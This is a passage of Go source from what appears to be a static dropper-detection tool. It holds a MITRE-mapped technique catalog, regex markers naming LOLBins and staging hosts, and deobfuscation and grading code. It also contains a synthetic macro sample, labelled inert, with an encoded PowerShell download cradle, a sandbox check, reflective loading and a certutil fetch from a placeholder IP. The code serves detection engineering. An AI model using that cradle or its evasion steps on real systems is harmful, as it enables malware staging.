		Detail:    "Uses only signed LOLBins for staging. For authorized lab analysis and detection engineering only.",
		Commands:  []string{"# LOLBin-only dropper", "# MITRE T1218"},
		Markers:   []string{"certutil|bitsadmin|mshta|regsvr32|rundll32"},
		Detection: []string{"Hunt markers of LOLBin-only dropper", "Map to T1218", "Baseline legit use"},
		Refs:      []string{"ATT&CK T1218"},
		Tags:      []string{"dropper", "stager"},
	},
	{
		ID: "DR-EMAIL", Name: "Email attachment dropper", Category: "Dropper", Platform: "cross",
		Tactic: "TA0001", Technique: "T1566.001", Severity: "high",
		Summary:   "Attachment + user execution.",
		Detail:    "Attachment + user execution. For authorized lab analysis and detection engineering only.",
		Commands:  []string{"# Email attachment dropper", "# MITRE T1566.001"},
		Markers:   []string{"Content-Disposition:\\s*attachment", "filename=.*\\.(docm|xlsm|js|vbs|iso)"},
		Detection: []string{"Hunt markers of Email attachment dropper", "Map to T1566.001", "Baseline legit use"},
		Refs:      []string{"ATT&CK T1566.001"},
		Tags:      []string{"dropper", "stager"},
	},
	{
		ID: "DR-WEBDAV", Name: "WebDAV staging", Category: "Dropper", Platform: "windows",
		Tactic: "TA0011", Technique: "T1105", Severity: "medium",
		Summary:   "Fetch payload over WebDAV.",
		Detail:    "Fetch payload over WebDAV. For authorized lab analysis and detection engineering only.",
		Commands:  []string{"# WebDAV staging", "# MITRE T1105"},
		Markers:   []string{"\\\\\\\\.*@SSL\\\\\\\\DavWWWRoot", "WebDAV"},
		Detection: []string{"Hunt markers of WebDAV staging", "Map to T1105", "Baseline legit use"},
		Refs:      []string{"ATT&CK T1105"},
		Tags:      []string{"dropper", "stager"},
	},
	{
		ID: "DR-SMB", Name: "SMB staging share", Category: "Dropper", Platform: "windows",
		Tactic: "TA0011", Technique: "T1105", Severity: "medium",
		Summary:   "Copy payload from attacker SMB share.",
		Detail:    "Copy payload from attacker SMB share. For authorized lab analysis and detection engineering only.",
		Commands:  []string{"# SMB staging share", "# MITRE T1105"},
		Markers:   []string{"copy\\s+\\\\\\\\\\\\\\\\", "net\\s+use\\s+\\\\\\\\\\\\\\\\"},
		Detection: []string{"Hunt markers of SMB staging share", "Map to T1105", "Baseline legit use"},
		Refs:      []string{"ATT&CK T1105"},
		Tags:      []string{"dropper", "stager"},
	},
	{
		ID: "DR-PASTEBIN", Name: "Paste site staging", Category: "Dropper", Platform: "cross",
		Tactic: "TA0011", Technique: "T1102", Severity: "medium",
		Summary:   "Fetch stage from pastebin/gist.",
		Detail:    "Fetch stage from pastebin/gist. For authorized lab analysis and detection engineering only.",
		Commands:  []string{"# Paste site staging", "# MITRE T1102"},
		Markers:   []string{"pastebin\\.com|gist\\.github|hastebin|rentry\\.co"},
		Detection: []string{"Hunt markers of Paste site staging", "Map to T1102", "Baseline legit use"},
		Refs:      []string{"ATT&CK T1102"},
		Tags:      []string{"dropper", "stager"},
	},
	{
		ID: "DR-DISKLESS", Name: "Fileless dropper", Category: "Dropper", Platform: "windows",
		Tactic: "TA0005", Technique: "T1055", Severity: "critical",
		Summary:   "No file written; memory-only execution.",
		Detail:    "No file written; memory-only execution. For authorized lab analysis and detection engineering only.",
		Commands:  []string{"# Fileless dropper", "# MITRE T1055"},
		Markers:   []string{"fileless", "in.?memory", "Assembly\\.Load"},
		Detection: []string{"Hunt markers of Fileless dropper", "Map to T1055", "Baseline legit use"},
		Refs:      []string{"ATT&CK T1055"},
		Tags:      []string{"dropper", "stager"},
	},
	{
		ID: "DR-SIGNED", Name: "Signed binary proxy dropper", Category: "Dropper", Platform: "windows",
		Tactic: "TA0005", Technique: "T1218", Severity: "high",
		Summary:   "Proxy execution via signed host binary.",
		Detail:    "Proxy execution via signed host binary. For authorized lab analysis and detection engineering only.",
		Commands:  []string{"# Signed binary proxy dropper", "# MITRE T1218"},
		Markers:   []string{"signed.?proxy", "WDAC.?bypass"},
		Detection: []string{"Hunt markers of Signed binary proxy dropper", "Map to T1218", "Baseline legit use"},
		Refs:      []string{"ATT&CK T1218"},
		Tags:      []string{"dropper", "stager"},
	},
	{
		ID: "DR-TEMPLATE", Name: "RTF/template injection", Category: "Dropper", Platform: "windows",
		Tactic: "TA0011", Technique: "T1221", Severity: "high",
		Summary:   "Remote template injection in Office.",
		Detail:    "Remote template injection in Office. For authorized lab analysis and detection engineering only.",
		Commands:  []string{"# RTF/template injection", "# MITRE T1221"},
		Markers:   []string{"template.*https?://", "INCLUDEPICTURE|IncludeText"},
		Detection: []string{"Hunt markers of RTF/template injection", "Map to T1221", "Baseline legit use"},
		Refs:      []string{"ATT&CK T1221"},
		Tags:      []string{"dropper", "stager"},
	},
	{
		ID: "DR-DDE", Name: "DDE / field code dropper", Category: "Dropper", Platform: "windows",
		Tactic: "TA0011", Technique: "T1559.002", Severity: "medium",
		Summary:   "DDEAUTO field executes command.",
		Detail:    "DDEAUTO field executes command. For authorized lab analysis and detection engineering only.",
		Commands:  []string{"# DDE / field code dropper", "# MITRE T1559.002"},
		Markers:   []string{"DDEAUTO|\\bDDE\\b", "\\\\\\\\d\\s+"},
		Detection: []string{"Hunt markers of DDE / field code dropper", "Map to T1559.002", "Baseline legit use"},
		Refs:      []string{"ATT&CK T1559.002"},
		Tags:      []string{"dropper", "stager"},
	},
	{
		ID: "DR-XLM", Name: "Excel 4.0 XLM macros", Category: "Dropper", Platform: "windows",
		Tactic: "TA0011", Technique: "T1059.005", Severity: "high",
		Summary:   "XLM CALL/EXEC download+run.",
		Detail:    "XLM CALL/EXEC download+run. For authorized lab analysis and detection engineering only.",
		Commands:  []string{"# Excel 4.0 XLM macros", "# MITRE T1059.005"},
		Markers:   []string{"=\\s*(?:CALL|EXEC|REGISTER)\\(", "Excel\\s*4|XLM|Auto_Open"},
		Detection: []string{"Hunt markers of Excel 4.0 XLM macros", "Map to T1059.005", "Baseline legit use"},
		Refs:      []string{"ATT&CK T1059.005"},
		Tags:      []string{"dropper", "stager"},
	},
	{
		ID: "DR-ONENOTE", Name: "OneNote embedded dropper", Category: "Dropper", Platform: "windows",
		Tactic: "TA0011", Technique: "T1204", Severity: "medium",
		Summary:   "OneNote .one with embedded payload.",
		Detail:    "OneNote .one with embedded payload. For authorized lab analysis and detection engineering only.",
		Commands:  []string{"# OneNote embedded dropper", "# MITRE T1204"},
		Markers:   []string{"\\.one\\b", "OneNote"},
		Detection: []string{"Hunt markers of OneNote embedded dropper", "Map to T1204", "Baseline legit use"},
		Refs:      []string{"ATT&CK T1204"},
		Tags:      []string{"dropper", "stager"},
	},
}

// catalogByID returns the entry with the given id, or ok=false.
func catalogByID(id string) (CatalogEntry, bool) {
	for _, e := range catalog {
		if strings.EqualFold(e.ID, id) {
			return e, true
		}
	}
	return CatalogEntry{}, false
}

// categories returns the sorted distinct category set in the catalog.
func categories() []string {
	seen := map[string]bool{}
	var out []string
	for _, e := range catalog {
		if e.Category != "" && !seen[e.Category] {
			seen[e.Category] = true
			out = append(out, e.Category)
		}
	}
	sort.Strings(out)
	return out
}

// platforms returns the sorted distinct platform set in the catalog.
func platforms() []string {
	seen := map[string]bool{}
	var out []string
	for _, e := range catalog {
		if e.Platform != "" && !seen[e.Platform] {
			seen[e.Platform] = true
			out = append(out, e.Platform)
		}
	}
	sort.Strings(out)
	return out
}

// searchCatalog matches a free-text query against most text fields.
func searchCatalog(q string) []CatalogEntry {
	q = strings.ToLower(strings.TrimSpace(q))
	if q == "" {
		return nil
	}
	terms := strings.Fields(q)
	var out []CatalogEntry
	for _, e := range catalog {
		hay := strings.ToLower(strings.Join([]string{e.ID, e.Name, e.Category, e.Platform, e.Tactic, e.Technique, e.Summary, e.Detail, strings.Join(e.Commands, " "), strings.Join(e.Tags, " ")}, " "))
		all := true
		for _, t := range terms {
			if !strings.Contains(hay, t) {
				all = false
				break
			}
		}
		if all {
			out = append(out, e)
		}
	}
	return out
}

// filterByCategory returns catalog entries in a category (case-insensitive).
func filterByCategory(cat string) []CatalogEntry {
	var out []CatalogEntry
	for _, e := range catalog {
		if strings.EqualFold(e.Category, cat) {
			out = append(out, e)
		}
	}
	return out
}

// filterByPlatform returns catalog entries for a platform.
func filterByPlatform(p string) []CatalogEntry {
	var out []CatalogEntry
	for _, e := range catalog {
		if strings.EqualFold(e.Platform, p) || strings.EqualFold(e.Platform, "any") || strings.EqualFold(e.Platform, "cross") {
			out = append(out, e)
		}
	}
	return out
}

// severityCounts tallies findings by severity.
func severityCounts(fs []Finding) map[string]int {
	m := map[string]int{}
	for _, f := range fs {
		m[strings.ToLower(f.Severity)]++
	}
	return m
}

// ====================================================================
//  GRADING ENGINE
// ====================================================================

// gradeFor converts an accumulated risk score into an A+..F grade.
func gradeFor(score int) string {
	switch {
	case score <= 0:
		return "A+"
	case score < 10:
		return "A"
	case score < 25:
		return "B"
	case score < 50:
		return "C"
	case score < 90:
		return "D"
	case score < 150:
		return "E"
	default:
		return "F"
	}
}

// scoreFindings sums weighted severities into a single risk score.
func scoreFindings(fs []Finding) int {
	total := 0
	for _, f := range fs {
		w := sevWeight[strings.ToLower(f.Severity)]
		if w == 0 {
			w = 3
		}
		total += w
	}
	return total
}

// gradeExplain returns a short human explanation of a grade.
func gradeExplain(g string) string {
	switch g {
	case "A+":
		return "No material exposure observed in this analysis."
	case "A":
		return "Minimal exposure; only low-impact items present."
	case "B":
		return "Minor exposure; review flagged items at leisure."
	case "C":
		return "Moderate exposure; remediation recommended."
	case "D":
		return "Significant exposure; prioritise remediation."
	case "E":
		return "Severe exposure; urgent remediation required."
	default:
		return "Critical exposure; treat as actively exploitable."
	}
}

// ====================================================================
//  MARKER SCANNER
// ====================================================================

// compiledMarker pairs a catalog entry with a compiled regex marker.
type compiledMarker struct {
	entry CatalogEntry
	re    *regexp.Regexp
	raw   string
}

// buildMarkers compiles every marker in the catalog once. Markers that
// fail to compile as regex are matched as literal substrings instead.
func buildMarkers() []compiledMarker {
	var out []compiledMarker
	for _, e := range catalog {
		for _, m := range e.Markers {
			re, err := regexp.Compile("(?i)" + m)
			if err != nil {
				re = nil
			}
			out = append(out, compiledMarker{entry: e, re: re, raw: m})
		}
	}
	return out
}

// sortFindings orders findings by severity (desc) then file/line.
func sortFindings(fs []Finding) {
	sort.SliceStable(fs, func(i, j int) bool {
		ri, rj := sevRank[strings.ToLower(fs[i].Severity)], sevRank[strings.ToLower(fs[j].Severity)]
		if ri != rj {
			return ri > rj
		}
		if fs[i].File != fs[j].File {
			return fs[i].File < fs[j].File
		}
		return fs[i].Line < fs[j].Line
	})
}

// ====================================================================
//  SHANNON ENTROPY (used by several analyzers)
// ====================================================================

// shannonEntropy returns bits/byte entropy of a buffer (0..8).
func shannonEntropy(b []byte) float64 {
	if len(b) == 0 {
		return 0
	}
	var freq [256]int
	for _, c := range b {
		freq[c]++
	}
	var h float64
	n := float64(len(b))
	for _, f := range freq {
		if f == 0 {
			continue
		}
		p := float64(f) / n
		h -= p * math.Log2(p)
	}
	return h
}

// entropyGrade labels an entropy value.
func entropyGrade(h float64) string {
	switch {
	case h >= 7.5:
		return "very-high (packed/encrypted)"
	case h >= 6.5:
		return "high (compressed/encoded)"
	case h >= 5.0:
		return "moderate"
	case h >= 3.0:
		return "low"
	default:
		return "very-low (plain/structured)"
	}
}

// ====================================================================
//  COMMON DECODERS (deobfuscation helpers reused by tools)
// ====================================================================

// tryBase64 decodes a base64 token if it looks like one.
func tryBase64(s string) (string, bool) {
	s = strings.TrimSpace(s)
	if len(s) < 8 || len(s)%4 != 0 {
		// try standard anyway with padding tolerance
	}
	for _, dec := range []*base64.Encoding{base64.StdEncoding, base64.RawStdEncoding, base64.URLEncoding, base64.RawURLEncoding} {
		if b, err := dec.DecodeString(s); err == nil && len(b) > 0 && isMostlyPrintable(b) {
			return string(b), true
		}
	}
	return "", false
}

// tryBase64UTF16 decodes PowerShell -EncodedCommand (UTF-16LE base64).
func tryBase64UTF16(s string) (string, bool) {
	b, err := base64.StdEncoding.DecodeString(strings.TrimSpace(s))
	if err != nil || len(b) < 2 {
		return "", false
	}
	// strip UTF-16LE: take every other byte
	var out []byte
	for i := 0; i+1 < len(b); i += 2 {
		if b[i+1] == 0 {
			out = append(out, b[i])
		}
	}
	if len(out) > 0 && isMostlyPrintable(out) {
		return string(out), true
	}
	return "", false
}

// isMostlyPrintable reports whether a buffer is mostly printable ASCII.
func isMostlyPrintable(b []byte) bool {
	if len(b) == 0 {
		return false
	}
	printable := 0
	for _, c := range b {
		if (c >= 0x20 && c < 0x7f) || c == '\n' || c == '\r' || c == '\t' {
			printable++
		}
	}
	return float64(printable)/float64(len(b)) > 0.85
}

// hexDecodeStr decodes a hex string if valid.
func hexDecodeStr(s string) (string, bool) {
	s = strings.TrimSpace(s)
	s = strings.ReplaceAll(s, "0x", "")
	s = strings.ReplaceAll(s, " ", "")
	if len(s) == 0 || len(s)%2 != 0 {
		return "", false
	}
	b, err := hex.DecodeString(s)
	if err != nil || !isMostlyPrintable(b) {
		return "", false
	}
	return string(b), true
}

// ====================================================================
//  SAMPLE ANALYZER v1 — layered decode, per-technique aggregation,
//  kill-chain inference. Static only: nothing is executed or fetched.
// ====================================================================

// layer is one view of the sample: the raw text, or text recovered by a decoder.
type layer struct {
	Name  string // "raw", "strings", "base64 @L12", …
	Depth int
	Text  string
}

const maxLayers = 64
const maxLayerBytes = 4 << 20

var (
	reEncCmd   = regexp.MustCompile(`(?i)-e(?:nc(?:odedcommand)?|c)?\s+([A-Za-z0-9+/]{16,}={0,2})`)
	reB64Lit   = regexp.MustCompile(`(?i)(?:FromBase64String\s*\(\s*['"]|atob\s*\(\s*['"]|b64decode\s*\(\s*b?['"]|echo\s+['"]?)([A-Za-z0-9+/]{16,}={0,2})`)
	reB64Blob  = regexp.MustCompile(`[A-Za-z0-9+/]{40,}={0,2}`)
	reHexBlob  = regexp.MustCompile(`(?i)(?:\\x[0-9a-f]{2}){10,}|(?:0x[0-9a-f]{2}\s*,\s*){10,}0x[0-9a-f]{2}|\b[0-9a-f]{40,}\b`)
	reCharCode = regexp.MustCompile(`(?i)(?:\[char\]\s*\(?\s*\d{2,3}\s*\)?\s*\+?\s*){6,}|(?:chr\(\d{2,3}\)\s*[&+]\s*){6,}chr\(\d{2,3}\)|fromcharcode\(\s*(?:\d{2,3}\s*,\s*){5,}\d{2,3}\s*\)`)
	reDigits   = regexp.MustCompile(`\d{2,3}`)
	reConcat   = regexp.MustCompile(`['"]\s*\+\s*['"]|['"]\s*&\s*['"]`)
	reTick     = regexp.MustCompile("`([A-Za-z])")
)

// isBinary reports whether data looks like a binary file rather than text.
func isBinary(b []byte) bool {
	n := len(b)
	if n > 8192 {
		n = 8192
	}
	for _, c := range b[:n] {
		if c == 0 {
			return true
		}
	}
	return n > 0 && !isMostlyPrintable(b[:n])
}

// extractStrings pulls ASCII and UTF-16LE strings (≥ min chars) out of a
// binary, one per line, so markers can be matched against a PE/ELF/doc.
func extractStrings(b []byte, min int) string {
	var sb strings.Builder
	var cur []byte
	flush := func() {
		if len(cur) >= min {
			sb.Write(cur)
			sb.WriteByte('\n')
		}
		cur = cur[:0]
	}
	for _, c := range b {
		if c >= 0x20 && c < 0x7f || c == '\t' {
			cur = append(cur, c)
		} else {
			flush()
		}
	}
	flush()
	for start := 0; start < 2; start++ { // UTF-16LE at both alignments
		for i := start; i+1 < len(b); i += 2 {
			if b[i+1] == 0 && b[i] >= 0x20 && b[i] < 0x7f {
				cur = append(cur, b[i])
			} else {
				flush()
			}
		}
		flush()
	}
	return sb.String()
}

// decodeLayers recursively recovers obfuscated text (PowerShell
// -EncodedCommand, base64 literals and blobs, hex / \x escapes, char-code
// arrays, string concatenation, PowerShell backtick escapes) up to depth 3.
func decodeLayers(first layer) []layer {
	out := []layer{first}
	seen := map[string]bool{first.Text: true}
	total := len(first.Text)
	push := func(name string, depth int, txt string) {
		txt = strings.TrimSpace(txt)
		if len(txt) < 8 || seen[txt] || len(out) >= maxLayers || total+len(txt) > maxLayerBytes {
			return
		}
		seen[txt] = true
		total += len(txt)
		out = append(out, layer{Name: name, Depth: depth, Text: txt})
	}
	for i := 0; i < len(out); i++ {
		l := out[i]
		if l.Depth >= 3 {
			continue
		}
		d := l.Depth + 1
		lineOf := func(off int) int { return strings.Count(l.Text[:off], "\n") + 1 }
		where := func(off int) string {
			if l.Name == "raw" || l.Name == "strings" {
				return fmt.Sprintf(" @L%d", lineOf(off))
			}
			return " in " + l.Name
		}
		for _, m := range reEncCmd.FindAllStringSubmatchIndex(l.Text, -1) {
			if s, ok := tryBase64UTF16(l.Text[m[2]:m[3]]); ok {
				push("PowerShell -EncodedCommand"+where(m[0]), d, s)
			}
		}
		for _, m := range reB64Lit.FindAllStringSubmatchIndex(l.Text, -1) {
			tok := l.Text[m[2]:m[3]]
			if s, ok := tryBase64(tok); ok {
				push("base64 literal"+where(m[0]), d, s)
			} else if s, ok := tryBase64UTF16(tok); ok {
				push("base64 (UTF-16)"+where(m[0]), d, s)
			}
		}
		for _, m := range reB64Blob.FindAllStringIndex(l.Text, 200) {
			tok := l.Text[m[0]:m[1]]
			if s, ok := tryBase64(tok); ok {
				push("base64 blob"+where(m[0]), d, s)
			} else if s, ok := tryBase64UTF16(tok); ok {
				push("base64 blob (UTF-16)"+where(m[0]), d, s)
			}
		}
		for _, m := range reHexBlob.FindAllStringIndex(l.Text, 100) {
			tok := strings.NewReplacer("\\x", "", "\\X", "", "0x", "", "0X", "", ",", "", " ", "").Replace(l.Text[m[0]:m[1]])
			if s, ok := hexDecodeStr(tok); ok {
				push("hex"+where(m[0]), d, s)
			}
		}
		for _, m := range reCharCode.FindAllStringIndex(l.Text, 100) {
			var b []byte
			for _, n := range reDigits.FindAllString(l.Text[m[0]:m[1]], -1) {
				if v, err := strconv.Atoi(n); err == nil && v < 256 {
					b = append(b, byte(v))
				}
			}
			if isMostlyPrintable(b) {
				push("char-code array"+where(m[0]), d, string(b))
			}
		}
		// concatenation / backtick obfuscation: 'Down'+'load' , D`own`load
		norm := reTick.ReplaceAllString(reConcat.ReplaceAllString(l.Text, ""), "$1")
		if norm != l.Text {
			push("de-concatenated "+l.Name, l.Depth, norm)
		}
	}
	return out
}

// techniqueHit aggregates every marker hit of one catalog entry in a sample.
type techniqueHit struct {
	entry   CatalogEntry
	markers map[string]bool
	hits    []string // "layer:Lnn: text"
	line    int
	layers  map[string]bool
}

// Primitive groups used for kill-chain inference.
var (
	downloadIDs = map[string]bool{"DR-POWERSHELL": true, "DR-CERTUTIL": true, "DR-BITS": true, "DR-CURLWGET": true,
		"DR-VBS": true, "DR-JSCRIPT": true, "DR-MSHTA": true, "DR-REGSVR": true, "DR-TEMPLATE": true, "DR-WEBDAV": true,
		"DR-SMB": true, "DR-PASTEBIN": true, "DR-MACRO": true, "DR-PYTHON": true}
	executeIDs = map[string]bool{"DR-SHELLCODE": true, "DR-PROCESSINJ": true, "DR-EARLYBIRD": true, "DR-PHOLLOW": true,
		"DR-DOTNET": true, "DR-REFLECTIVE": true, "DR-RUNDLL": true, "DR-WMI": true, "DR-MSBUILD": true,
		"DR-INSTALLUTIL": true, "DR-DISKLESS": true}
	evasionIDs = map[string]bool{"DR-SANDBOX": true, "DR-MOTW": true}
	reExec     = regexp.MustCompile(`(?i)\bIEX\b|Invoke-Expression|Start-Process|\.ShellExecute|Shell\.Run|WScript\.Shell.*\.Run|\|\s*(?:ba|z|da)?sh\b|chmod\s+\+x\s+\S+\s*(?:&&|;)\s*\./|os\.system|subprocess\.(?:Popen|call|run)|\bexec\s*\(`)
)

func downgrade(sev string, steps int) string {
	order := []string{"info", "low", "medium", "high", "critical"}
	i := sevRank[strings.ToLower(sev)] - 1
	if i < 0 {
		i = 0
	}
	i -= steps
	if i < 0 {
		i = 0
	}
	return order[i]
}

// analysisResult is a full static analysis of one sample.
type analysisResult struct {
	Report   Report
	Layers   []layer
	Binary   bool
	Entropy  float64
	Chain    []string
	IOCs     map[string][]string
	Decoded  int
	MaxDepth int
}

// analyzeSample runs layered decoding, marker aggregation, chain inference,
// embedded-blob detection and IOC extraction over one sample.
func analyzeSample(name string, data []byte, withIOCs bool) analysisResult {
	res := analysisResult{Binary: isBinary(data), Entropy: shannonEntropy(data)}
	first := layer{Name: "raw", Text: string(data)}
	if res.Binary {
		first = layer{Name: "strings", Text: extractStrings(data, 6)}
	}
	res.Layers = decodeLayers(first)
	for _, l := range res.Layers {
		if l.Depth > res.MaxDepth {
			res.MaxDepth = l.Depth
		}
		if l.Depth > 0 {
			res.Decoded++
		}
	}
	markers := buildMarkers()
	hits := map[string]*techniqueHit{}
	var order []string
	execHit, execEv := false, ""
	for _, l := range res.Layers {
		for ln, text := range strings.Split(l.Text, "\n") {
			if strings.TrimSpace(text) == "" {
				continue
			}
			for _, cm := range markers {
				if cm.re != nil && !cm.re.MatchString(text) || cm.re == nil && !strings.Contains(strings.ToLower(text), strings.ToLower(cm.raw)) {
					continue
				}
				h := hits[cm.entry.ID]
				if h == nil {
					h = &techniqueHit{entry: cm.entry, markers: map[string]bool{}, line: ln + 1, layers: map[string]bool{}}
					hits[cm.entry.ID] = h
					order = append(order, cm.entry.ID)
				}
				h.markers[cm.raw] = true
				h.layers[l.Name] = true
				if len(h.hits) < 4 {
					ev := strings.TrimSpace(text)
					if len(ev) > 140 {
						ev = ev[:140] + "…"
					}
					h.hits = append(h.hits, fmt.Sprintf("[%s L%d] %s", l.Name, ln+1, ev))
				}
			}
			if !execHit && reExec.MatchString(text) {
				execHit, execEv = true, fmt.Sprintf("[%s L%d] %s", l.Name, ln+1, trunc(strings.TrimSpace(text), 120))
			}
		}
	}
	var fs []Finding
	strong := map[string]bool{}
	for _, id := range order {
		h := hits[id]
		e := h.entry
		sev := e.Severity
		title := e.Name
		weak := len(e.Markers) >= 2 && len(h.markers) < 2
		if weak {
			sev, title = downgrade(sev, 2), e.Name+" (weak signal: 1 of "+strconv.Itoa(len(e.Markers))+" markers)"
		} else {
			strong[id] = true
		}
		var ls []string
		for k := range h.layers {
			ls = append(ls, k)
		}
		sort.Strings(ls)
		decodedOnly := !h.layers["raw"] && !h.layers["strings"]
		detail := e.Summary
		if decodedOnly {
			detail += " Only visible after decoding (" + strings.Join(ls, ", ") + ")."
		}
		fs = append(fs, Finding{RuleID: id, Title: title, Severity: sev, Score: sevWeight[sev], Tactic: tacticName(e.Tactic),
			Technique: e.Technique, File: name, Line: h.line, Evidence: strings.Join(h.hits, "  ‖  "), Detail: detail,
			Detection: strings.Join(e.Detection, "; "), Refs: e.Refs, Fprint: fingerprint(id, name)})
	}
	// obfuscation layers themselves
	if res.Decoded > 0 {
		var names []string
		for _, l := range res.Layers[1:] {
			if len(names) < 6 {
				names = append(names, l.Name)
			}
		}
		sev := "low"
		if res.MaxDepth >= 2 {
			sev = "medium"
		}
		fs = append(fs, Finding{RuleID: "DR-OBFUSCATION", Title: fmt.Sprintf("Obfuscated content (%d decoded layer(s), depth %d)", res.Decoded, res.MaxDepth),
			Severity: sev, Score: sevWeight[sev], Tactic: "Defense Evasion", Technique: "T1027", File: name,
			Evidence: strings.Join(names, "; "), Detail: "Content was recovered by decoding; nested encoding is typical of staged droppers hiding their next stage.",
			Detection: "Log decoded script blocks (PowerShell 4104 / AMSI) instead of raw command lines", Fprint: fingerprint("obf", name)})
	}
	// kill-chain inference: fetch → run (→ evade)
	var dl, ex, ev []string
	for id := range strong {
		switch {
		case downloadIDs[id]:
			dl = append(dl, id)
		case executeIDs[id]:
			ex = append(ex, id)
		case evasionIDs[id]:
			ev = append(ev, id)
		}
	}
	sort.Strings(dl)
	sort.Strings(ex)
	sort.Strings(ev)
	if len(ex) == 0 && execHit {
		ex = append(ex, "exec-primitive")
	}
	if len(dl) > 0 && len(ex) > 0 {
		sev, title := "high", "Download-and-execute chain"
		if len(ev) > 0 || res.MaxDepth >= 2 {
			sev, title = "critical", "Download-and-execute chain with evasion / layered obfuscation"
		}
		res.Chain = append(append(append([]string{}, dl...), ex...), ev...)
		evid := "fetch: " + strings.Join(dl, ",") + " → run: " + strings.Join(ex, ",")
		if len(ev) > 0 {
			evid += " → evade: " + strings.Join(ev, ",")
		}
		if execEv != "" && ex[0] == "exec-primitive" {
			evid += "  ‖  " + execEv
		}
		fs = append(fs, Finding{RuleID: "DR-CHAIN", Title: title, Severity: sev, Score: sevWeight[sev], Tactic: "Command and Control",
			Technique: "T1105", File: name, Evidence: evid,
			Detail:    "The sample both retrieves content and executes it — the defining behaviour of a dropper/stager.",
			Detection: "Alert on a script interpreter or LOLBin making a network fetch followed by execution/injection in the same process tree", Fprint: fingerprint("chain", name)})
	}
	// large embedded encoded payload in a text sample
	if !res.Binary {
		longest := 0
		for _, m := range reB64Blob.FindAllString(string(data), -1) {
			if len(m) > longest {
				longest = len(m)
			}
		}
		if longest >= 2048 {
			fs = append(fs, Finding{RuleID: "DR-EMBEDDED-BLOB", Title: fmt.Sprintf("Embedded encoded payload (%d chars)", longest),
				Severity: "medium", Score: sevWeight["medium"], Tactic: "Defense Evasion", Technique: "T1027.009", File: name,
				Evidence: fmt.Sprintf("longest base64 run %d chars ≈ %d bytes decoded", longest, longest*3/4),
				Detail:   "A script carrying a large encoded blob usually embeds its next stage (PE, shellcode or archive).", Fprint: fingerprint("blob", name)})
		}
	} else if res.Entropy >= 7.2 {
		fs = append(fs, Finding{RuleID: "DR-PACKED", Title: fmt.Sprintf("Packed or encrypted binary (entropy %.2f)", res.Entropy),
			Severity: "low", Score: sevWeight["low"], Tactic: "Defense Evasion", Technique: "T1027.002", File: name,
			Evidence: entropyGrade(res.Entropy), Detail: "Near-random byte distribution — compressed, packed or encrypted content hides strings from static scanning.", Fprint: fingerprint("ent", name)})
	}
	res.IOCs = map[string][]string{}
	if withIOCs {
		var all strings.Builder
		for _, l := range res.Layers {
			all.WriteString(l.Text + "\n")
		}
		ips, us, ems, paths := extractIOCs(all.String())
		res.IOCs["ip"], res.IOCs["url"], res.IOCs["email"], res.IOCs["path"] = ips, us, ems, paths
		fs = append(fs, iocsToFindings(name, ips, us, ems, paths)...)
	}
	res.Report = buildReport("analyze", name, mergeFindings(fs))
	return res
}

// tacticName maps TA00xx ids to ATT&CK tactic names.
func tacticName(t string) string {
	if n, ok := map[string]string{"TA0001": "Initial Access", "TA0002": "Execution", "TA0003": "Persistence",
		"TA0004": "Privilege Escalation", "TA0005": "Defense Evasion", "TA0006": "Credential Access",
		"TA0007": "Discovery", "TA0008": "Lateral Movement", "TA0009": "Collection", "TA0010": "Exfiltration",
		"TA0011": "Command and Control", "TA0040": "Impact"}[t]; ok {
		return n
	}
	return t
}

// analyzePath reads a file and analyses it.
func analyzePath(path string, withIOCs bool) (analysisResult, error) {
	b, err := os.ReadFile(path)
	if err != nil {
		return analysisResult{}, err
	}
	return analyzeSample(filepath.Base(path), b, withIOCs), nil
}

// demoSample is a synthetic, inert stager used by --demo and the self-test:
// a VBA macro that hides a PowerShell download cradle in -EncodedCommand,
// whose decoded body base64-loads a .NET assembly and checks for a sandbox.
func demoSample() string {
	inner := "$u='http://198.51.100.10/stage2.bin'; $d=(New-Object Net.WebClient).DownloadData($u); " +
		"if((Get-WmiObject Win32_ComputerSystem).Model -match 'VMware|VirtualBox'){exit}; Start-Sleep 90; " +
		"[Reflection.Assembly]::Load($d).EntryPoint.Invoke($null,$null)"
	u16 := make([]byte, 0, len(inner)*2)
	for _, c := range []byte(inner) {
		u16 = append(u16, c, 0)
	}
	enc := base64.StdEncoding.EncodeToString(u16)
	return "' synthetic ODropper lab sample — inert, for detection testing only\n" +
		"Sub AutoOpen()\n" +
		"    Set sh = CreateObject(\"WScript.Shell\")\n" +
		"    sh.Run \"power\" & \"shell -nop -w hidden -enc " + enc + "\", 0\n" +
		"End Sub\n" +
		"' fallback: certutil -urlcache -split -f http://198.51.100.10/p.exe %TEMP%\\p.exe\n"
}

// ====================================================================
//  REPORT BUILD + GRADING
// ====================================================================

func buildReport(mode, target string, fs []Finding) Report {
	if fs == nil {
		fs = []Finding{} // JSON [] rather than null when clean
	}
	sortFindings(fs)
	score := scoreFindings(fs)
	g := gradeFor(score)
	sc := severityCounts(fs)
	summary := fmt.Sprintf("%d finding(s): %d critical, %d high, %d medium, %d low, %d info.",
		len(fs), sc["critical"], sc["high"], sc["medium"], sc["low"], sc["info"])
	return Report{
		Tool:       APPNAME,
		Version:    VERSION,
		Tagline:    TAGLINE,
		Generated:  time.Now().Format(time.RFC3339),
		Target:     target,
		Mode:       mode,
		Findings:   fs,
		Grade:      g,
		Score:      score,
		Summary:    summary,
		MitrePrime: PRIMARY_MITRE,
	}
}

// ====================================================================
//  EXPORT ENGINE  (txt / md / json / csv / sarif)
// ====================================================================

func exportTXT(r Report) string {
	var b strings.Builder
	b.WriteString("OWL " + r.Tool + " — " + r.Tagline + "\n")
	b.WriteString("Version " + r.Version + "   Generated " + r.Generated + "\n")
	b.WriteString("Author khaled.s.haddad   owlsec.org\n")
	b.WriteString(strings.Repeat("=", 72) + "\n")
	if r.Target != "" {
		b.WriteString("Target : " + r.Target + "\n")
	}
	b.WriteString("Mode   : " + r.Mode + "\n")
	b.WriteString("Primary MITRE : " + r.MitrePrime + "\n")
	b.WriteString("Grade  : " + r.Grade + " (score " + strconv.Itoa(r.Score) + ") — " + gradeExplain(r.Grade) + "\n")
	b.WriteString("Summary: " + r.Summary + "\n")
	b.WriteString(strings.Repeat("-", 72) + "\n\n")
	for i, f := range r.Findings {
		b.WriteString(fmt.Sprintf("[%d] %s  (%s)\n", i+1, f.Title, strings.ToUpper(f.Severity)))
		b.WriteString("    Rule      : " + f.RuleID + "\n")
		b.WriteString("    MITRE     : " + f.Technique + "  " + f.Tactic + "\n")
		if f.File != "" {
			b.WriteString(fmt.Sprintf("    Location  : %s:%d\n", f.File, f.Line))
		}
